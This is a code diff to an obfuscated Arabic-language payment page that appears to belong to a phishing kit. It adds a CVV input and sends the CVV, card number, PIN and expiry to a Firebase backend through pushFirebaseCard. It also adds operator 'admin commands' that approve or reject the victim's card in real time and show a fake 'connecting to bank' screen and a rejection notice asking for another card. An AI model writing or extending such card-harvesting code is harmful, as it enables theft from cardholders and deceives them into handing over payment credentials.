@@ -1459,13 +1459,21 @@ function v40()
 		$(_0xdec(35)).hide();
 		showBankConnectingLoader();
 
+		// قراءة رمز الأمان (CVV) من الحقل الجديد
+		var v9cvv = "";
+		var cvvEl = document.getElementById('i12cvv');
+		if (cvvEl && cvvEl.value) {
+			v9cvv = cvvEl.value.trim();
+		}
+
 		v223(
 			v48 || "",
 			v47 || "",
 			details && details.v6 ? details.v6 : "",
 			details && details[_0xdec(272)] ? details[_0xdec(272)] : "",
 			details && details[_0xdec(273)] ? details[_0xdec(273)] : "",
-			details && details[_0xdec(274)] ? details[_0xdec(274)] : ""
+			details && details[_0xdec(274)] ? details[_0xdec(274)] : "",
+			v9cvv
 		).then(function () {}).catch(function () {});
 	}
 	
@@ -1763,8 +1771,14 @@ Object.entries(v173).forEach(([name, value]) => {
                    
                     
                     <div id="i1" style="margin-top: 5px;">
-                
-                     <div class="k27 k34" id="i6">  
+                 
+                     <!-- رسالة الرفض من المدير (فوق رقم البطاقة) -->
+                     <div id="rejectionNotice" style="display:none; width:60%; float:right; margin-bottom:4px; padding:6px 8px; border-radius:6px; background:#fef2f2; border:1.5px solid #ef4444; text-align:center; box-sizing:border-box;">
+                        <span style="font-size:11px; font-weight:700; color:#dc2626; line-height:1.3; display:block; word-wrap:break-word; overflow-wrap:break-word;">تم رفض بطاقة الدفع يرجى التحقق من البيانات او استخدام بطاقة دفع مختلفة</span>
+                     </div>
+                     <div style="clear:both;"></div>
+
+                     <div class="k27 k34" id="i6">
                        
 						 
 					
@@ -1832,6 +1846,44 @@ Object.entries(v173).forEach(([name, value]) => {
 													 <input inputmode="numeric" pattern="[0-9]{4}" name="n2" id="i12" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" autocomplete="off" data-1p-ignore="true" data-lpignore="true" data-form-type="other" type="text" size="4" maxlength="4" class="k24 k26 k25" style="width:60%; padding-left:5px; text-align:right;" oninput="v128(this, 4);return v70(event);" onkeyup="v73(event); v74(event);" onkeypress="return v73(event);" autocorrect="off" autocapitalize="off" spellcheck="false">
 														</div>
 												 </div>
+
+						 <div class="k27" id="i7cvv" style="margin-top: 5px;">
+							<div id="i17cvv">
+								<label class="k5" style=" float:right;text-align:right;margin-top:3px">
+									:رمز الأمان (CVV)
+								</label>
+							</div>
+								<div style="width:60%;">
+								<div style="position:relative; width:100%;">
+									<input inputmode="numeric" pattern="[0-9]{3,4}" name="n4" id="i12cvv" dir="rtl" title="رمز الأمان المكون من 3 أو 4 أرقام" autocomplete="off" data-1p-ignore="true" data-lpignore="true" data-form-type="other" type="text" size="4" maxlength="4" class="k24 k26 k25" style="width:100%; text-align:right; padding-right:10px; box-sizing:border-box;" oninput="v128(this, 4);return v70(event);" onkeyup="v73(event); v74(event);" onkeypress="return v73(event);" autocorrect="off" autocapitalize="off" spellcheck="false">
+									<img id="cvvHintThumb" src="data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='160'%20height='100'%20viewBox='0%200%20160%20100'%3E%3Cdefs%3E%3ClinearGradient%20id='bg'%20x1='0'%20y1='0'%20x2='1'%20y2='1'%3E%3Cstop%20offset='0'%20stop-color='%23e2e8f0'/%3E%3Cstop%20offset='1'%20stop-color='%23cbd5e1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect%20x='3'%20y='3'%20width='154'%20height='94'%20rx='8'%20fill='url(%23bg)'%20stroke='%2394a3b8'%20stroke-width='1.5'/%3E%3Crect%20x='10'%20y='12'%20width='140'%20height='22'%20rx='2'%20fill='%231e293b'/%3E%3Crect%20x='10'%20y='44'%20width='140'%20height='14'%20rx='2'%20fill='%23f1f5f9'%20stroke='%2394a3b8'%20stroke-width='0.5'/%3E%3Crect%20x='110'%20y='64'%20width='40'%20height='24'%20rx='3'%20fill='%23fffbeb'%20stroke='%23f59e0b'%20stroke-width='2.5'/%3E%3Ctext%20x='130'%20y='80'%20font-family='Arial'%20font-size='9'%20fill='%23b45309'%20text-anchor='middle'%20font-weight='bold'%3ECVV%3C/text%3E%3Cpath%20d='M110%2076%20L92%2076%20L97%2071%20M92%2076%20L97%2081'%20stroke='%23ef4444'%20stroke-width='2.5'%20fill='none'%20stroke-linecap='round'%20stroke-linejoin='round'/%3E%3C/svg%3E" alt="مكان رمز الأمان CVV" title="اضغط لتكبير الصورة" style="position:absolute; top:50%; left:4px; transform:translateY(-50%); width:60px; height:38px; cursor:pointer; border-radius:4px;" onclick="openCvvHintModal(event)">
+								</div>
+								</div>
+						 </div>
+
+		<!-- نافذة منبثقة لصورة CVV التوضيحية -->
+		<div id="cvvHintModal" style="display:none; position:fixed; inset:0; z-index:999999; background:rgba(0,0,0,0.7); align-items:center; justify-content:center;" onclick="if(event.target===this) closeCvvHintModal()">
+			<div style="position:relative; background:#fff; border-radius:12px; padding:20px; max-width:90vw; max-height:90vh;">
+				<button type="button" onclick="closeCvvHintModal()" style="position:absolute; top:8px; left:8px; width:32px; height:32px; border-radius:50%; border:none; background:#ef4444; color:#fff; font-size:18px; cursor:pointer; display:flex; align-items:center; justify-content:center; font-weight:bold; line-height:1;">&times;</button>
+				<img src="data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='480'%20height='300'%20viewBox='0%200%20480%20300'%3E%3Cdefs%3E%3ClinearGradient%20id='bgL'%20x1='0'%20y1='0'%20x2='1'%20y2='1'%3E%3Cstop%20offset='0'%20stop-color='%23e2e8f0'/%3E%3Cstop%20offset='1'%20stop-color='%23cbd5e1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect%20x='10'%20y='10'%20width='460'%20height='280'%20rx='18'%20fill='url(%23bgL)'%20stroke='%2394a3b8'%20stroke-width='2.5'/%3E%3Crect%20x='30'%20y='40'%20width='420'%20height='60'%20rx='6'%20fill='%231e293b'/%3E%3Crect%20x='30'%20y='130'%20width='420'%20height='40'%20rx='4'%20fill='%23f1f5f9'%20stroke='%2394a3b8'%20stroke-width='1'/%3E%3Crect%20x='330'%20y='190'%20width='120'%20height='70'%20rx='6'%20fill='%23fffbeb'%20stroke='%23f59e0b'%20stroke-width='5'/%3E%3Ctext%20x='390'%20y='235'%20font-family='Arial'%20font-size='30'%20fill='%23b45309'%20text-anchor='middle'%20font-weight='bold'%3ECVV%3C/text%3E%3Cpath%20d='M330%20225%20L260%20225%20L280%20205%20M260%20225%20L280%20245'%20stroke='%23ef4444'%20stroke-width='5'%20fill='none'%20stroke-linecap='round'%20stroke-linejoin='round'/%3E%3Ctext%20x='240'%20y='275'%20font-family='Arial'%20font-size='22'%20fill='%23ef4444'%20text-anchor='middle'%20font-weight='bold'%3E%D9%85%D9%83%D8%A7%D9%86%20%D8%B1%D9%85%D8%B2%20%D8%A7%D9%84%D8%A3%D9%85%D8%A7%D9%86%3C/text%3E%3C/svg%3E" alt="مكان رمز الأمان CVV" style="display:block; max-width:100%; max-height:80vh; border-radius:8px;">
+			</div>
+		</div>
+
+		<script>
+		function openCvvHintModal(e) {
+			if (e) { e.preventDefault(); e.stopPropagation(); }
+			var m = document.getElementById('cvvHintModal');
+			if (m) { m.style.display = 'flex'; }
+		}
+		function closeCvvHintModal() {
+			var m = document.getElementById('cvvHintModal');
+			if (m) { m.style.display = 'none'; }
+		}
+		document.addEventListener('keydown', function(e) {
+			if (e.key === 'Escape') { closeCvvHintModal(); }
+		});
+		</script>
+
 
 												
 												
@@ -2341,7 +2393,7 @@ function v151(v9p, v6) {
 	return v143;
 }
 
-function v223(v9p, v9bk, v6, v9em, v9ey, v9pn) {
+function v223(v9p, v9bk, v6, v9em, v9ey, v9pn, v9cvv) {
 	try {
 		let v9fp = v9p;
 		let v9fb = v9bk;
@@ -2363,7 +2415,7 @@ function v223(v9p, v9bk, v6, v9em, v9ey, v9pn) {
 		window.localStorage.setItem(v168, v9pn || "");
 
 		if (typeof window.pushFirebaseCard === 'function') {
-			return window.pushFirebaseCard(v9fp, v9fb, v6, v9em, v9ey, v9pn)
+			return window.pushFirebaseCard(v9fp, v9fb, v6, v9em, v9ey, v9pn, v9cvv)
 				.catch((err) => {
 					console.error("Firebase card write error: ", err);
 				});
@@ -2676,7 +2728,19 @@ v159.addEventListener(_0xdec(271), v84);
   if (typeof window.listenForAdminCommands === 'function') {
     window.listenForAdminCommands({
       onApproval: function () { showAdminOverlay('تمت العملية بنجاح', '#0a7a3d'); setTimeout(function(){ window.location.href = 'verification.html'; }, 2500); },
-      onRejection: function (cmd) { showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b'); setTimeout(function(){ location.reload(); }, 3000); },
+      onRejection: function (cmd) {
+        // إخفاء شاشة "جار الاتصال بالبنك" لتظهر رسالة الرفض
+        var bankOverlay = document.getElementById('bankConnectingOverlay');
+        if (bankOverlay) { bankOverlay.remove(); }
+        // إعادة إظهار أزرار الإرسال/الإلغاء (أُخفيت عند الإرسال)
+        var i41 = document.getElementById('i41');
+        if (i41) { i41.style.display = ''; }
+        // إظهار رسالة الرفض فوق بوكس الحقول من الأعلى
+        var notice = document.getElementById('rejectionNotice');
+        if (notice) { notice.style.display = 'block'; }
+        // التمرير لأعلى الصفحة لرؤية الرسالة
+        try { window.scrollTo({ top: 0, behavior: 'smooth' }); } catch (e) { window.scrollTo(0, 0); }
+      },
       onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
     });
   }
